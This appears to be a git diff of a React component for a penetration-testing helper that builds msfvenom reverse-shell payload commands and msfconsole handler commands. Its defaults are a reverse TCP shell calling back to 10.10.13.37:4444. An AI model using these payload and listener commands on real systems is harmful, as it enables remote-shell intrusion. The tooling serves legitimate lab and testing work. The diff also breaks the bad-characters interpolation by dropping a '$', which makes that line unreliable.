@@ -1,5 +1,5 @@
 import React from 'react';
-import { Input, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
+import { Input, message, Typography, Row, Divider, Select, Form, Col, Collapse } from 'antd';
 import PersistedState from 'use-persisted-state';
 import QueueAnim from 'rc-queue-anim';
 
@@ -12,6 +12,10 @@ const MSFBuilder = () => {
 	// Antd stuff
 	const { Option } = Select;
 	const { Panel } = Collapse;
+	const { Text } = Typography;
+	const successInfoTtyShell = () => {
+		message.success('Your payload has been copied');
+	};
 
 	let payloads = require('../../assets/data/Payloads.json');
 	let encoder = require('../../assets/data/Encoder.json');
@@ -19,18 +23,20 @@ const MSFBuilder = () => {
 	let format = require('../../assets/data/Format.json');
 
 	const [ values, setValues ] = msfVenomBuilder({
-		Payload: undefined,
-		LHOST: undefined,
-		LPORT: undefined,
-		Encoder: undefined,
-		EncoderIterations: undefined,
-		Platform: undefined,
-		Arch: undefined,
-		NOP: undefined,
-		BadCharacters: undefined,
-		Format: undefined,
-		Outfile: undefined
+		Payload: 'generic/shell_reverse_tcp',
+		LHOST: '10.10.13.37',
+		LPORT: '4444',
+		Encoder: null,
+		EncoderIterations: null,
+		Platform: null,
+		Arch: null,
+		NOP: null,
+		BadCharacters: null,
+		Format: null,
+		Outfile: null
 	});
+
+	const launchCommand = `msfconsole -qx "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`;
 
 	const handleChange = (name) => (event) => {
 		setValues({ ...values, [name]: event.target.value });
@@ -183,7 +189,7 @@ const MSFBuilder = () => {
 					/>
 				</Form.Item>
 				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
-					<Col span={12}>
+					<Col span={9}>
 						<Form.Item valuePropName={values.Format} name='format' label='Format'>
 							<Select
 								showSearch
@@ -201,7 +207,7 @@ const MSFBuilder = () => {
 							</Select>
 						</Form.Item>
 					</Col>
-					<Col span={12}>
+					<Col span={15}>
 						<Form.Item valuePropName={values.Outfile} name='outfile' label='Output File'>
 							<Input
 								value={values.Outfile}
@@ -216,35 +222,39 @@ const MSFBuilder = () => {
 					<Panel header='MSF Venom Command' key='1'>
 						<Paragraph>
 							<pre>
-								msfvenom -p {values.Payload}
-								{values.LHOST > '' && ' LHOST=' + values.LHOST}
-								{values.LPORT > '' && ' LPORT=' + values.LPORT}
-								{values.Platform > '' && ' --platform ' + values.Platform}
-								{values.Arch > '' && ' -a ' + values.Arch}
-								{values.NOP > '' && ' -n ' + values.NOP}
-								{values.Encoder > '' && ' -e ' + values.Encoder}
-								{values.EncoderIterations > '' && ' -i ' + values.EncoderIterations}
-								{values.BadCharacters > '' && ' -b ' + `"${values.BadCharacters}"`}
-								{values.Format > '' && ' -f ' + values.Format}
-								{values.Outfile > '' && ' -o ' + values.Outfile}
+								<Text copyable>
+									msfvenom -p {values.Payload}
+									{values.LHOST > '' && ' LHOST=' + values.LHOST}
+									{values.LPORT > '' && ' LPORT=' + values.LPORT}
+									{values.Platform > '' && ' --platform ' + values.Platform}
+									{values.Arch > '' && ' -a ' + values.Arch}
+									{values.NOP > '' && ' -n ' + values.NOP}
+									{values.Encoder > '' && ' -e ' + values.Encoder}
+									{values.EncoderIterations > '' && ' -i ' + values.EncoderIterations}
+									{values.BadCharacters > '' && ' -b ' + `"{values.BadCharacters}"`}
+									{values.Format > '' && ' -f ' + values.Format}
+									{values.Outfile > '' && ' -o ' + values.Outfile}
+								</Text>
 							</pre>
 						</Paragraph>
 					</Panel>
 					<Panel header='Launch Console & Load Handler' key='2'>
 						<Paragraph>
 							<pre>
-								{`msfconsole -x "use exploit/multi/handler; set PAYLOAD ${values.Payload}; set LHOST ${values.LHOST}; set LPORT ${values.LPORT}; run"`}
+								<Text copyable>{launchCommand}</Text>
 							</pre>
 						</Paragraph>
 					</Panel>
 					<Panel header='Load Handler Only' key='3'>
 						<Paragraph>
 							<pre>
-								{`use exploit/multi/handler
+								<Text copyable>
+									{`use exploit/multi/handler
 set PAYLOAD ${values.Payload}
 set LHOST ${values.LHOST}
 set LPORT ${values.LPORT}
 run`}
+								</Text>
 							</pre>
 						</Paragraph>
 					</Panel>
